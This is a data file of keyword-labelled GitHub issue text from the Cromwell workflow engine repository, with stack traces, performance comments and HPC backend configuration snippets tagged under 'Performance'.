cromwell-system-akka.actor.default-dispatcher-16",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:757,cache,cache,757,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['cache'],['cache']
Performance,Let's stash all the data in a GCP Task Queue and pull it in to the DB with a separate service.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316438740:39,Queue,Queue,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316438740,1,['Queue'],['Queue']
Performance,Like.$anonfun$run$1(WordSpecLike.scala:1192); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.WordSpecLike.run(WordSpecLike.scala:1192); at org.scalatest.WordSpecLike.run$(WordSpecLike.scala:1190); at cromwell.CromwellTestKitWordSpec.run(CromwellTestKitSpec.scala:250); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4457:10206,Concurren,ConcurrentRestrictions,10206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4457,7,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,Like.$anonfun$run$1(WordSpecLike.scala:1192); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.WordSpecLike.run(WordSpecLike.scala:1192); at org.scalatest.WordSpecLike.run$(WordSpecLike.scala:1190); at cromwell.CromwellTestKitWordSpec.run(CromwellTestKitSpec.scala:250); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:10024,Concurren,ConcurrentRestrictions,10024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,14,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,Like.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cr,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5131,concurren,concurrent,5131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,Limit number of queued jobs per workflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356:16,queue,queued,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356,1,['queue'],['queued']
Performance,Limit the number of failed cache hit copy attempts [BA-6430],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5514:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5514,1,['cache'],['cache']
Performance,Load Control,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3366:0,Load,Load,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3366,2,['Load'],['Load']
Performance,Load balanced Cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3339:0,Load,Load,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3339,1,['Load'],['Load']
Performance,Load control tweaks,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3540:0,Load,Load,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3540,1,['Load'],['Load']
Performance,Load controller service and rate limiter,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3335:0,Load,Load,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3335,1,['Load'],['Load']
Performance,Loading environment modules,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997:0,Load,Loading,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997,1,['Load'],['Loading']
Performance,"LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0623fc0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.io.pinned-dispatcher-7"" #23 prio=5 os_prio=31 tid=0x00007fb76b450800 nid=0x7303 runnable [0x000000012cdb8000]; java.lang.Thread.State: RUNNABLE; at sun.nio.ch.KQueueArrayWrapper.kevent0(Native Method); at sun.nio.ch.KQueueArrayWra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:41608,concurren,concurrent,41608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,Look good in the separated perf tests so 👍 from me. @salonishah11 - I'll merge this for you so that I can get started with horizontalling the performance tests.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5036#issuecomment-503651495:142,perform,performance,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5036#issuecomment-503651495,1,['perform'],['performance']
Performance,"Looking at the actual SQL above . 1. If possible doing a ""SELECT 1"" (or any other constant) instead of ""SELECT *"" when dealing with EXISTS can be more performance. * requires pulling back all the data from the table for that row, whereas all you're doing is checking for existence. This can make a difference where the WHERE clause is completely satisfied by data within the index being used and the second seek back to the actual data does not need to happen . 2. My only concern is the performance of lots of EXISTS in MySQL. They should be fine, and if this was Oracle I wouldn't worry... but MySQL has proven to be a bit dumb about complex subqueries and don't know if EXISTS would fit into the same bucket. However, this will be proven out during testing... my guess is that if there is a problem it won't be subtle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469804405:151,perform,performance,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469804405,2,['perform'],['performance']
Performance,"Looking at the existing `JobPreparationActor` code I saw that the Docker hash credentials are being created by calling this method in `BackendLifecycleActorFactory`:; ```; def dockerHashCredentials(initializationDataOption: Option[BackendInitializationData]): List[Any] = List.empty; ```; The JES backend overrides this to return a non-empty `List`. Since we don't yet have the required `BackendInitializationData` during workflow materialization, @Horneth suggested the Docker hash calculation be performed slightly downstream in workflow initialization instead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621:498,perform,performed,498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621,1,['perform'],['performed']
Performance,Looking forward to this feature. When enabled the `check-alive` command call via `exit-code-timeout-seconds` currently polls on average once every 10 seconds per running job (under minimum load).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949:189,load,load,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949,1,['load'],['load']
Performance,"Looking into the failing unit test here, which is passing for me locally. It looks like non-default NIO filesystems aren't getting loaded in the github action test run, though they are locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912:131,load,loaded,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1651859912,1,['load'],['loaded']
Performance,"Looks awesome to me. Thinking out loud.....:. - (PO q) If a hash lookup fails (i.e. I mean the dockerhub request, not the expression evaluation), not even starting the workflow might be the expected behaviour, because ""don't waste my money starting an entire analysis when in 2 minutes I can resubmit and get CC""?; - (Separate ticket?) Should we also have a ""disable docker hash cache"" option, for Lee's very-fast iterations? Or just a ""clear hash cache"" REST endpoint?; - ToL: The hash lookup cache may also need to be aware of local vs remote hashes; - ToL: one step further away from dynamic backend assignment 😢",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797:379,cache,cache,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797,6,['cache'],['cache']
Performance,Looks good delta some final feedback incorporation and a performance test on alpha.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469900089:57,perform,performance,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4702#issuecomment-469900089,2,['perform'],['performance']
Performance,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:601,load,loading,601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['load'],['loading']
Performance,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:100,race condition,race condition,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981,1,['race condition'],['race condition']
Performance,"Looks like Travis caches' deletion doesn't solve the problem with centaurHoricromtalEngineUpgradePapiV2 builds (BA-6164). There're still errors like `ERROR: for cromwell-summarizer-plus-backend Container ""dcdaaee217fb"" is unhealthy.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5340#issuecomment-571829738:18,cache,caches,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5340#issuecomment-571829738,1,['cache'],['caches']
Performance,"Looks like there is a test that's guarding against my change. I believe this test is incorrect, but I'll leave that confirmation to you (maybe @cjllanwarne as it looks like you wrote the original test):. [`ValueEvaluatorSpec.scala#L538-L542`](https://github.com/broadinstitute/cromwell/blob/50f28da6a665526c1bdb1d5528400ee9deeaa5d4/wdl/model/draft2/src/test/scala/wdl/expression/ValueEvaluatorSpec.scala#L538-L542); ```scala; ""Optional values"" should ""fail to perform addition with the + operator if the argument is None"" in {; val hello = WomString(""hello ""); val noneWorld = WomOptionalValue.none(WomStringType); hello.add(noneWorld) should be(Failure(OptionalNotSuppliedException(""+""))); }; ```. Relevant text from original PR:. The [WDL Spec: _Interpolating and concatenating optional strings_](https://github.com/openwdl/wdl/blob/master/versions/development/SPEC.md#interpolating-and-concatenating-optional-strings). > Within interpolations, string concatenation with the + operator has special typing properties to facilitate formulation of command-line flags. [...] If either operand has an optional type, then the concatenation has type String?, and the runtime result is None if either operand is None",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-661974971:460,perform,perform,460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-661974971,1,['perform'],['perform']
Performance,"Lots of changes to `SingleWorkflowRunnerActor`:; - Clients communicate with SWRA via an ask, giving callers like `Main` a `Future` whose success status can be used to generate an exit code.; - SWRA no longer manages shutting down the actor system, that becomes the responsibility of the caller. This allows tests that want to see certain error messages to shut down the system only after the error messages are seen by an event filter. The previous structure allowed for a race condition where messages that filters wanted to see were produced, but the actor system was torn down before the messages were delivered to the filters.; - SWRA is now an FSM. Also increased the default patience in `CromwellTestkitSpec` for `InputLocalizationWorkflowSpec` and friends. Does _not_ include any changes to address MySQL connection issues sporadically seen in SlickDataAccessSpec; per discussion with Jeff I'll ticket that separately.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/311:473,race condition,race condition,473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/311,1,['race condition'],['race condition']
Performance,M$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: lenthall.exception.AggregatedException: :; Variable 'non_existent_scatter_variable' not found; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:373); 	... 20 common frames omitted; 	Suppressed: wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'non_existent_scatter_variable' not found; 		at wdl4s.exception.VariableNotFoundException$.apply(LookupException.scala:17); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at scala.Option.getOrElse(Option.scala:121); 		at wdl4s.Scope$class.lookup$1(Scope.scala:267); 		at wdl4s.Scope$$anonfun$lookupFunction$1.apply(Scope.scala:274); 		at wdl4s.Sc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2020:3024,concurren,concurrent,3024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2020,1,['concurren'],['concurrent']
Performance,"M. Example pipeline:. ```; version 1.0. # WORKFLOW DEFINITION; workflow WholeGenomeGermlineSingleSample {; call SumFloats; output {; Float out = SumFloats.total_size; }; }. task SumFloats {; input {; Array[Float] sizes = [1,2,3,4,5.0]; Int preemptible_tries=3; }. command <<<; python -c ""print ~{sep=""+"" sizes}""; >>>; output {; Float total_size = read_float(stdout()); }; runtime {; docker: ""us.gcr.io/broad-gotc-prod/python:2.7""; preemptible: preemptible_tries; }; }; ```. The error raised with cromwell-53 is:; Failed to read_float(""/data/og/ted/cromwell-executions/WholeGenomeGermlineSingleSample/00090ef9-5211-4f18-9de9-daf3de791408/call-SumFloats/execution/stdout"") (reason 1 of 1): For input string: ""15.0; 15.0""; The stdout file truly contains this. Running with local backend returns no error.; Contents of conf file:. ```; backend {; default = ""SLURM""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; include required(classpath(""reference_local_provider_config.inc.conf"")); concurrent-job-limit = 30; }; }; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpu = 1; Int requested_memory_mb_per_core = 8000; Int memory_mb = 4000; String queue = ""short""; String? docker; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpu} \; --mem ${memory_mb} \; --wrap ""/bin/bash ${script}""; """"""; submit-docker = """"""; docker pull ${docker}. sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpu} \; --mem ${memory_mb} \; --wrap ""docker run -v ${cwd}:${docker_cwd} ${docker} ${job_shell} ${docker_cwd}/execution/script""; """""". kill = ""scancel ${job_id}""; check-alive = ""scontrol show job ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; ```. Any thoughts?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5932:1154,concurren,concurrent-job-limit,1154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5932,4,"['concurren', 'queue']","['concurrent-job-limit', 'queue']"
Performance,Made call cache hash endpoint more JSONic,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471:10,cache,cache,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471,1,['cache'],['cache']
Performance,"Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2020-10-08 16:08:58,573 cromwell-system-akka.dispatchers.backend-dispatcher-533 INFO - DispatchedConfigAsyncJobExecutionActor [UUID(45d03417)hello.say_hello:NA:1]: `which python; python --version; echo ""Hello ZZZ!"" > file.txt`; 2020-10-08 16:08:58,593 cromwell-system-akka.dispatchers.backend-dispatcher-533 INFO - DispatchedConfigAsyncJobExecutionActor [UUID(45d03417)hello.say_hello:NA:1]: executing: module load proxy; # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; export SINGULARITY_CACHEDIR=/scratch/$USER/.singularity/cache; export SINGULARITY_LOCALCACHEDIR=/scratch/$USER/.singularity/localcache; export SINGULARITY_TMPDIR=/scratch/$USER/.singularity/tmp; mkdir -p $SINGULARITY_CACHEDIR; mkdir -p $SINGULARITY_LOCALCACHEDIR; mkdir -p $SINGULARITY_TMPDIR; export SINGULARITY_BINDPATH=input_data/hello,$EXECUTION_ROOT:/cromwell-executions,/usr/prog/nx/cromwell/test; # echo ""SINGULARITY_CACHEDIR: $SINGULARITY_CACHEDIR""; # echo ""SINGULARITY_BINDPATH: $SINGULARITY_BINDPATH""; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $SINGULARITY_CACHEDIR; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These show up in stdout.submit.; flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec --containall docker://python@sha256:d03b690584424b88488e555e26820e458cc624e9d004e3fa0fe3ff99aa81b2b4 echo ""Success pulling docker!""; echo ""module load singularity/v3.5.2 && singularity exec --containall --b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:7236,cache,cache,7236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['cache'],['cache']
Performance,Make cached-copy localization strategy aware of the maximum number of hardlinks. [BA-5748],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043:5,cache,cached-copy,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043,1,['cache'],['cached-copy']
Performance,Malformed UUID causes Call Cache Diff to timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2453:27,Cache,Cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2453,1,['Cache'],['Cache']
Performance,"Managed to fix the problem. Cromwell 32 errorred and explained the problem. The filesystem section was moved to the SGE section. Are config file now looks like this:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; }; }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197:320,concurren,concurrent-job-limit,320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197,1,['concurren'],['concurrent-job-limit']
